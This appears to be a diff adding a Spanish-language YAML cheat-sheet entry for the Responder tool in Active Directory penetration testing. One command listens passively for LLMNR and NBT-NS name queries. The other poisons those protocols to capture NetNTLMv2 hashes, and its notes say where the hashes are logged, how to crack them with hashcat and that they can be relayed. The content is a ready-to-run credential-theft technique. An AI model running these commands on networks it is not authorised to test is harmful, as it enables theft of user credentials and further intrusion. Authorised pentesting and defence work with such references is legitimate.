@@ -1,0 +1,27 @@
+# Comandos de Responder: envenenamiento de LLMNR, NBT-NS y mDNS.
+tool: responder
+area: ad
+url: https://github.com/lgandx/Responder
+commands:
+  - id: responder-analyze
+    title: Escuchar LLMNR y NBT-NS sin envenenar
+    cmd: |
+      sudo responder -I {{IFACE}} -A
+    phase: recon
+    tags: [llmnr, responder]
+    notes: >-
+      Modo análisis: solo enseña quién pregunta qué nombres por difusión. Si salen peticiones, la red
+      es vulnerable y ya sabes qué equipos y qué nombres mal escritos se buscan.
+    refs: [https://github.com/lgandx/Responder]
+
+  - id: responder-poison
+    title: Capturar hashes NetNTLMv2 envenenando LLMNR y NBT-NS
+    cmd: |
+      sudo responder -I {{IFACE}} -dwv
+    phase: credential-access
+    tags: [llmnr, responder, ntlm]
+    notes: >-
+      Contesta a cualquier nombre que no resuelva el DNS y pide autenticación NTLM a quien se conecte.
+      Los hashes quedan en /usr/share/responder/logs y se crackean con hashcat -m 5600 (no sirven para
+      Pass-the-Hash, pero sí para relay).
+    refs: [https://github.com/lgandx/Responder]
